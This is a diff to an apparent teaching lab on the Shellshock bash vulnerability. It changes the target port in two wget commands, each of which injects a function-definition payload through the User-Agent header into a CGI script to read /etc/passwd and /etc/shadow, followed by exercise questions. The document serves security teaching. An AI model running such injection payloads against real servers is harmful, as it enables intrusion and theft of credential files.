@@ -126,7 +126,7 @@ read the man page of shadow (man shadow). Inspect the files /etc/passwd and /etc
 Now we can try the attack. Using =wget= run:
 
 #+begin_src bash
-wget -O /tmp/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost/cgi-bin/test.bash
+wget -O /tmp/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost:3080/cgi-bin/test.bash
 #+end_src
 
 Test it. What do you get?
@@ -136,7 +136,7 @@ Test it. What do you get?
 ** Try again
 
 #+begin_src bash
-wget -O /tmp/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/shadow" http://localhost/cgi-bin/test.bash
+wget -O /tmp/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/shadow" http://localhost:3080/cgi-bin/test.bash
 #+end_src
 
 *Question 9* Explain why this attack didn't work.
